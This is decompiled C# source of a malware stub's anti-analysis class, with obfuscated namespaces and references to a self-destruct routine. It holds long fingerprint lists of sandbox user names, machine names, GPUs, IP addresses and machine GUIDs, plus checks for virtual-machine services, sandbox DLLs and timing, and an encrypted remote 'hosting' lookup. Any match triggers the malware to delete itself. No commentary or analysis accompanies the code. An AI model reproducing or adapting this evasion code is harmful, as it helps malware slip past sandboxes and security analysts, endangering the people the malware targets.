using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000005 RID: 5
	internal sealed class AntiAnalysis
	{
		// Token: 0x0600001C RID: 28
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x0600001D RID: 29 RVA: 0x00005208 File Offset: 0x00003408
		public static bool SuspiciousPCUsername()
		{
			string[] array = new string[]
			{
				"05h00Gi0", "05KvAUQKPQ", "21zLucUnfI85", "3u2v9m8", "43By4", "4tgiizsLimS", "5sIBK", "5Y3y73", "grepete", "64F2tKIqO5",
				"6O4KyHhJXBiR", "7DBgdxu", "7wjlGX7PjlW4", "8LnfAai9QdJR", "8Nl0ColNQ5bq", "8VizSM", "9yjCPsEYIMH", "Abby", "acox", "Amy",
				"andrea", "AppOnFlySupport", "barbarray", "benjah", "Bruno", "BUiA1hkm", "BvJChRPnsxn", "BXw7q", "cather", "cM0uEGN4do",
				"cMkNdS6", "DdQrgc", "DefaultAccount", "doroth", "dOuyo8RV71", "DVrzi", "dxd8DJ7c", "e60UW", "ecVtZ5wE", "EGG0p",
				"equZE3J", "fNBDSlDTXY", "Frank", "fred", "G2DbYLDgzz8Y", "george", "GexwjQdjXG", "GGw8NR", "GJAm1NxXVm", "GjBsjb",
				"gL50ksOp", "gu17B", "Guest", "h7dk1xPr", "h86LHD", "HAPUBWS", "Harry Johnson", "hbyLdJtcKyN1", "HEUeRzl", "hmarc",
				"ICQja5iT", "IVwoKUF", "IZZuXj", "j6SHA37KA", "j7pNjWM", "JAW4Dz0", "JcOtj17dZx", "jeremdiaz", "John", "John Doe",
				"jude", "Julia", "katorres", "kEecfMwgj", "kevans", "kFu0lQwgX5P", "KUv3bT4", "l3cnbB8Ar5b8", "Lisa", "lK3zMR",
				"lmVwjj9b", "Louise", "lubi53aN14cU", "Lucas", "Marci", "mike", "Mr.None", "noK4zG7ZhOf", "nZAp7UBVaS1", "o6jdigq",
				"o8yTi52T", "Of20XqH4VL", "OgJb6GqgK0O", "OZFUCOD6", "patex", "PateX", "Paul Jones", "pf5vj", "PgfV1X", "PqONjHVwexsS",
				"pWOuqdTDQ", "PxmdUOpVyx", "QfofoG", "QmIS5df7u", "QORxJKNk", "qZo9A", "rB5BnfuR2", "RDhJ0CNFevzX", "rexburns", "RGzcBUyrznReg",
				"Rt1r7", "ryjIJKIrOMs", "S7Wjuf", "sal.rosenburg", "server", "SqgFOf3G", "Steve", "test", "tHiF2T", "tim",
				"timcoo", "TVM", "txWas1m2t", "tylerfl", "uHUQIuwoEFU", "UiQcX", "umehunt", "umyUJ", "Uox1tzaMO", "User01",
				"UspG1y1C", "vzY4jmH0Jw02", "w0fjuOVmCcP5A", "WDAGUtilityAccount", "XMiMmcKziitD", "xPLyvzr8sgC", "xUnUy", "ykj0egq7fze", "ymONofg", "YmtRdbA",
				"zOEsT"
			};
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				string text = Environment.UserName.ToLowerInvariant();
				flag = array.Contains(text);
			}
			return flag;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x0000575C File Offset: 0x0000395C
		public static bool SuspiciousPCName()
		{
			string[] array = new string[]
			{
				"00900BC83802", "00900BC83803", "0CC47AC83803", "18C9ACDF-7C00-4", "3CECEFC83806", "6C4E733F-C2D9-4", "ABIGAI", "ACEPC", "AIDANPC", "ALENMOOS-PC",
				"ALIONE", "APPONFLY-VPS", "ARCHIBALDPC", "azure", "B30F0242-1C6A-4", "BAROSINO-PC", "BECKER-PC", "BEE7370C-8C0C-4", "C81F66C83805", "CATWRIGHT",
				"CHSHAW", "COFFEE-SHOP", "COMPNAME_4047", "COMPNAME_4416", "COMPNAME_4803", "CRYPTODEV222222", "d1bnJkfVlH", "DAPERE", "DOMIC-DESKTOP", "EA8C2E2A-D017-4",
				"EFA0FDEC-8FA7-4", "EIEEIFYE", "ESPNHOOL", "FERREIRA-W10", "floppy", "GANGISTAN", "GBQHURCC", "GRAFPC", "GRXNNIIE", "gYyZc9HZCYhRLNg",
				"JBYQTQBO", "JERRY-TRUJILLO", "JOHN-PC", "JUANYARO", "JUDES-DOJO", "JULIA-PC", "KEVINF", "LANTECH-LLC", "LISA-PC", "LOUISE-PC",
				"LUCAS-PC", "MARIEGRAY", "MARWAL", "MATTHEW", "MIKE-PC", "NETTYPC", "NPLBBLMK", "ORELEEPC", "ORXGKKZC", "Paul Jones",
				"PC-DANIELE", "PROPERTY-LTD", "Q9IATRKPRH", "QarZhrdBpj", "RALPHS-PC", "RYANWH", "SCOX", "SERVER-PC", "SERVER1", "Steve",
				"SYKGUIDE-WS17", "T00917", "test42", "TIQIYLA9TW5M", "TMKNGOMU", "TVM-PC", "Ub9w1K94X31iqkf", "VIDYHI", "VNNVRXUM", "VONRAHEL",
				"WILEYPC", "WIN-5E07COS9ALR", "WINDOWS-EEL53SN", "WINZDS-1BHRVPQU", "WINZDS-22URJIBV", "WINZDS-3FF2I9SN", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "WINZDS-8MAEI8E4", "WINZDS-9IO75SVG",
				"WINZDS-AM76HPK2", "WINZDS-B03L9CEO", "WINZDS-BMSMD8ME", "WINZDS-BUAOKGG1", "WINZDS-K7VIK4FC", "WINZDS-MILOBM35", "WINZDS-PU0URPVI", "WINZDS-QNGKGN59", "WINZDS-RST0E8VU", "WINZDS-U95191IG",
				"WINZDS-VQH86L5D", "WISIMS", "WORK", "BENREED", "WS-CARROT", "XC64ZB", "XGNSVODU", "YCLEXTAL", "ZDS_EDR_14", "ZDS_EDR_9",
				"ZELJAVA", "ZFKGDPGJ"
			};
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				string text = Environment.MachineName.ToLowerInvariant();
				flag = array.Contains(text);
			}
			return flag;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00005B84 File Offset: 0x00003D84
		public static bool SuspiciousGPU()
		{
			string[] array = new string[]
			{
				"29__HERE", "2G6C7Z61", "2RO_8UVU", "2SN538K4", "5KBK41_L", "5LXPA8ES", "5PECN6L1", "5RPFT3HZ", "6BOS4O7U", "6BZP2Y2_",
				"6F44ADR7", "6MPA93", "7229H9G9", "74ZZCY7A", "7TB9G6P7", "84KD1KSK", "8NYGK3FL", "8Y3BSXKG", "9SF72FG7", "9Z77DN4T",
				"_G31E46N", "_PHLNYGR", "_T9W5LHO", "AFRBR6TC", "B69OHLB2", "BDMD4C14", "CSUZOOXW", "CWTM14GS", "D6XUO1XB", "DE92L2UN",
				"DFXWTBCX", "ET1BXXAK", "F1K792VR", "FENYSTD", "H1_SDVLF", "H_EDEUEK", "HASZN_3F", "HKWURZU9", "HP8WD3MX", "HV61HV5F",
				"K9SC88UK", "KBBFOHZN", "KEZ744W", "KOD68ZH1", "KW5PTYKC", "L19KFFGO", "LD8LLLOD", "M5RGU9RY", "MDF5Z6ZO", "MKVW6M6X",
				"MTSUP2DX", "MYNP2R7E", "O25VL9P2", "O597EOTS", "OEFUG1_W", "OOUT3ENP", "OYVM_U6G", "P9T_AU3X", "PC1ESCG3", "PE86ZT",
				"R69XK_H3", "S6DZU3GA", "THUVF23F9", "TTXRONXD", "UKBEHH_S", "Virtual Desktop Monitor", "VirtualBox Graphics Adapter", "VirtualBox Graphics Adapter (WDDM)", "VM64TTFX", "VMware SVGA 3D",
				"VO5V631D", "W1TO6L3T", "W29FK1O1", "W2RTB1KRM", "WKMZ6LN2", "X4R9RZ5L", "X5ZW15TV", "XMX85CAL", "YANBV9OY", "YNVLCUKZ",
				"YVK4794D", "Z2P35N", "Z2P8CT__", "ZN_TF2UZ", "ZP62XCAP", "ZSHE4HM", "Стандартный VGA графический адаптер"
			};
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							object obj = managementBaseObject["Name"];
							if (obj == null)
							{
								goto IL_036B;
							}
							string text;
							if ((text = obj.ToString().ToLowerInvariant()) == null)
							{
								goto IL_036B;
							}
							IL_0371:
							string text2 = text;
							foreach (string text3 in array)
							{
								if (text2.Contains(text3))
								{
									Logging.Log(string.Format("AntiAnalysis: Suspicious GPU detected: {0}", managementBaseObject["Name"]), true);
									return true;
								}
							}
							continue;
							IL_036B:
							text = string.Empty;
							goto IL_0371;
						}
					}
				}
				catch (Exception ex)
				{
					Logging.Log("AntiAnalysis: Failed to check GPUs. Exception: " + ex.Message, true);
				}
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00005FBC File Offset: 0x000041BC
		public static bool SuspiciousProcess()
		{
			string[] array = new string[] { "VmRemoteGuest.exe", "Sysmon64.exe" };
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						string text = process.ProcessName.ToLowerInvariant();
						if (array.Contains(text))
						{
							Logging.Log("AntiAnalysis: Suspicious process detected: " + process.ProcessName, true);
							return true;
						}
					}
					catch (Exception ex) when (ex is InvalidOperationException || ex is Win32Exception)
					{
						Logging.Log("AntiAnalysis: Failed to access process information: " + ex.Message, true);
					}
				}
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000060B0 File Offset: 0x000042B0
		public static bool SuspiciousService()
		{
			string[] array = new string[] { "vmicheartbeat", "vmickvpexchange", "vmicrdv", "vmicshutdown", "vmictimesync", "vmicvss", "Sysmon64" };
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				try
				{
					ServiceController[] services = ServiceController.GetServices();
					foreach (ServiceController serviceController in services)
					{
						if (serviceController.Status == ServiceControllerStatus.Running)
						{
							string text = serviceController.ServiceName.ToLowerInvariant();
							if (array.Contains(text))
							{
								Logging.Log("AntiAnalysis: Suspicious running service detected: " + serviceController.ServiceName, true);
								return true;
							}
						}
					}
				}
				catch (Exception ex)
				{
					Logging.Log("AntiAnalysis: Failed to check services. Exception: " + ex.Message, true);
				}
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000061AC File Offset: 0x000043AC
		public static bool SuspiciousIP()
		{
			string[] array = new string[]
			{
				"10.200.169.204", "104.198.155.173", "104.200.151.35", "109.145.173.169", "109.226.37.172", "109.74.154.90", "109.74.154.91", "109.74.154.92", "140.228.21.36", "149.88.111.79",
				"154.61.71.50", "154.61.71.51", "172.105.89.202", "174.7.32.199", "176.63.4.179", "178.239.165.70", "181.214.153.11", "185.220.101.107", "185.44.176.125", "185.44.176.135",
				"185.44.176.143", "185.44.176.70", "185.44.176.85", "185.44.177.132", "185.44.177.133", "185.44.177.138", "185.44.177.193", "185.44.177.254", "185.44.177.55", "188.105.165.80",
				"188.105.71.44", "188.105.91.116", "188.105.91.143", "188.105.91.173", "191.101.209.39", "191.96.150.218", "192.211.110.74", "192.40.57.234", "192.87.28.103", "193.128.114.45",
				"193.225.193.201", "193.226.177.40", "194.110.13.70", "194.154.78.144", "194.154.78.152", "194.154.78.160", "194.154.78.169", "194.154.78.179", "194.154.78.210", "194.154.78.227",
				"194.154.78.230", "194.154.78.235", "194.154.78.77", "194.154.78.91", "194.186.142.178", "194.186.142.180", "194.186.142.183", "194.186.142.195", "194.186.142.204", "194.186.142.214",
				"194.186.142.236", "194.186.142.246", "195.181.175.103", "195.181.175.105", "195.228.105.39", "195.239.51.3", "195.239.51.42", "195.239.51.46", "195.239.51.59", "195.239.51.65",
				"195.239.51.73", "195.239.51.80", "195.239.51.89", "195.68.142.20", "195.68.142.3", "195.74.76.222", "2.94.86.134", "20.114.22.115", "20.99.160.173", "204.101.161.31",
				"204.101.161.32", "207.102.138.83", "207.102.138.93", "208.78.41.115", "209.127.189.74", "212.119.227.136", "212.119.227.151", "212.119.227.167", "212.119.227.179", "212.119.227.184",
				"212.41.6.23", "213.33.142.50", "213.33.190.109", "213.33.190.118", "213.33.190.171", "213.33.190.22", "213.33.190.227", "213.33.190.242", "213.33.190.35", "213.33.190.42",
				"213.33.190.46", "213.33.190.69", "213.33.190.74", "23.128.248.46", "34.105.0.27", "34.105.183.68", "34.105.72.241", "34.138.255.104", "34.138.96.23", "34.141.146.114",
				"34.141.245.25", "34.142.74.220", "34.145.195.58", "34.145.89.174", "34.17.49.70", "34.17.55.59", "34.253.248.228", "34.73.60.153", "34.83.46.130", "34.85.243.241",
				"34.85.253.170", "35.186.33.204", "35.192.93.107", "35.197.127.11", "35.199.6.13", "35.229.69.227", "35.237.47.12", "38.154.242.210", "45.8.148.171", "5.45.98.162",
				"52.250.30.131", "64.124.12.162", "67.218.111.202", "78.139.8.50", "79.104.209.109", "79.104.209.168", "79.104.209.172", "79.104.209.221", "79.104.209.231", "79.104.209.24",
				"79.104.209.249", "79.104.209.33", "79.104.209.36", "79.104.209.66", "80.211.0.97", "81.181.60.60", "84.147.54.113", "84.147.54.61", "84.147.56.249", "84.147.60.41",
				"84.147.60.52", "84.147.61.28", "84.147.62.12", "84.147.63.171", "84.147.63.236", "84.57.183.108", "84.57.200.69", "87.166.48.65", "87.166.50.1", "87.166.50.213",
				"87.166.51.209", "88.132.225.100", "88.132.226.203", "88.132.227.238", "88.132.231.71", "88.153.199.169", "88.64.35.141", "88.64.36.101", "88.66.107.75", "88.66.111.235",
				"88.66.8.175", "88.67.131.90", "88.67.134.91", "88.86.117.130", "89.208.29.106", "89.208.29.108", "89.208.29.140", "89.208.29.149", "89.208.29.63", "89.208.29.64",
				"89.208.29.95", "89.208.29.96", "89.208.29.97", "89.208.29.98", "92.211.109.160", "92.211.192.144", "92.211.52.62", "92.211.55.199", "93.216.75.209", "95.25.204.90",
				"95.25.71.112", "95.25.71.12", "95.25.71.5", "95.25.71.64", "95.25.71.65", "95.25.71.70", "95.25.71.80", "95.25.71.86", "95.25.71.87", "95.25.71.89",
				"95.25.71.92", "95.25.81.24", "None"
			};
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				try
				{
					IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
					foreach (IPAddress ipaddress in hostEntry.AddressList)
					{
						string text = ipaddress.ToString();
						if (array.Contains(text))
						{
							Logging.Log("AntiAnalysis: Suspicious IP detected: " + text, true);
							return true;
						}
					}
				}
				catch (Exception ex)
				{
					Logging.Log("AntiAnalysis: Failed to check IP addresses. Exception: " + ex.Message, true);
				}
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00006A60 File Offset: 0x00004C60
		public static bool SuspiciousMachineGuid()
		{
			string[] array = new string[]
			{
				"081ab395-5e85-4634-acdb-2dbd4f59a7d0", "089e621c-1422-4856-a8b1-3f1db208ce9e", "10797f1d-9613-4832-b1a3-c22fe365b89d", "15947802-cb9c-478f-af5c-33b1abbd1bfe", "1a85c660-1f98-42ca-b1cb-199f63e1d807", "2b5365f1-eebb-4135-b6e1-413aab299fcb", "4508afd3-5f05-491e-b49f-b44024967766", "453b8045-4cab-4c86-866a-4118a8ac4db6", "5c5926b0-d06a-4688-ade2-325cbb39b4fc", "6a94764b-5e0f-42cf-8947-df4b99cb5cf1",
				"6c25c4bf-bff0-421d-a4d1-6a31f02e4b7d", "6c5fe7fc-a9c6-46cd-baea-529d2dedc1df", "75ef93ec-1f67-4dbc-b494-f3e460792a4a", "801de7cf-3111-46e2-946b-65e7431dc386", "8459ba60-28e8-4648-9573-ee9fd08ce1c2", "9083fa32-68f2-4dff-a60e-e076f7aeabd3", "988e7c53-d2c0-4b7a-9de6-96944bce64e0", "9ad7283a-ef74-4969-a766-87a104f57d43", "a2014fb5-2ce1-436c-a05d-1c2c44fb3288", "a3d27cfa-1e7a-4ff8-8004-2be13417b6b1",
				"a47c70d8-7adc-4ad7-994f-644a8c84c176", "a8844a86-4277-45a7-809c-0c8132e08711", "bcac81ca-b4a1-429f-a8be-d684f4c00d27", "c1f1411f-c84a-4d1b-a6f7-b31c8bdd22d2", "c784477d-3fc3-4206-9876-55a4df3943da", "cbbb49d6-b7ff-44ca-aba5-8a5e250d4d42", "cdbd2082-8cfa-481b-ad9b-fc08276e590d", "fb31a63b-dc7c-49d2-8f59-4a30a2594045", "fd34ce94-8855-4c43-824b-81cc27d97788", "fec973c0-c782-43a8-854c-f9f48d935e0d"
			};
			bool flag;
			if (array == null || !array.Any<string>())
			{
				flag = false;
			}
			else
			{
				try
				{
					using (RegistryKey localMachine = Registry.LocalMachine)
					{
						using (RegistryKey registryKey = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
						{
							if (registryKey != null)
							{
								object value = registryKey.GetValue("MachineGuid");
								if (value != null)
								{
									string text = value.ToString().ToLowerInvariant();
									if (array.Contains(text))
									{
										Logging.Log("AntiAnalysis: Suspicious Machine GUID detected: " + text, true);
										return true;
									}
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					Logging.Log("AntiAnalysis: Failed to retrieve Machine GUID. Exception: " + ex.Message, true);
				}
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00006C54 File Offset: 0x00004E54
		public static bool Emulator()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Task.Delay(10).Wait();
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
				return false;
			}
			return false;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00006CB8 File Offset: 0x00004EB8
		public static async Task<bool> HostingAsync()
		{
			bool flag;
			try
			{
				string decryptedUrl = StringsCrypt.Decrypt(new byte[]
				{
					145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
					49, 235, 197, 102, 94, 163, 45, 250, 10, 108,
					175, 221, 139, 165, 121, 24
				});
				string text = await AntiAnalysis.HttpClient.GetStringAsync(decryptedUrl).ConfigureAwait(false);
				string status = text;
				text = null;
				flag = status.IndexOf("true", StringComparison.OrdinalIgnoreCase) >= 0;
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00006CF8 File Offset: 0x00004EF8
		public static bool SandBox()
		{
			string[] array = new string[] { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
			return array.Any((string dll) => AntiAnalysis.GetModuleHandle(dll + ".dll") != IntPtr.Zero);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00006D5C File Offset: 0x00004F5C
		public static bool Run()
		{
			bool flag;
			try
			{
				Task<bool> task = AntiAnalysis.HostingAsync();
				task.Wait();
				if (task.Result)
				{
					Logging.Log("AntiAnalysis: Hosting detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousGPU())
				{
					Logging.Log("AntiAnalysis: Suspicious GPU detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousProcess())
				{
					Logging.Log("AntiAnalysis: Suspicious process detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousService())
				{
					Logging.Log("AntiAnalysis: Suspicious service detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SandBox())
				{
					Logging.Log("AntiAnalysis: Sandbox detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.Emulator())
				{
					Logging.Log("AntiAnalysis: Emulator detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousIP())
				{
					Logging.Log("AntiAnalysis: Suspicious IP detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousPCName())
				{
					Logging.Log("AntiAnalysis: Suspicious PC name detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousPCUsername())
				{
					Logging.Log("AntiAnalysis: Suspicious PC username detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else if (AntiAnalysis.SuspiciousMachineGuid())
				{
					Logging.Log("AntiAnalysis: Suspicious Machine GUID detected! Self-destructing...", true);
					SelfDestruct.Melt();
					flag = true;
				}
				else
				{
					flag = false;
				}
			}
			catch (Exception ex)
			{
				Logging.Log("AntiAnalysis: An error occurred during anti-analysis checks. Exception: " + ex.Message, true);
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000038B4 File Offset: 0x00001AB4
		public AntiAnalysis()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000038C1 File Offset: 0x00001AC1
		static AntiAnalysis()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			AntiAnalysis.HttpClient = new HttpClient
			{
				Timeout = TimeSpan.FromSeconds(10.0)
			};
		}

		// Token: 0x04000013 RID: 19
		private static readonly HttpClient HttpClient;
	}
}
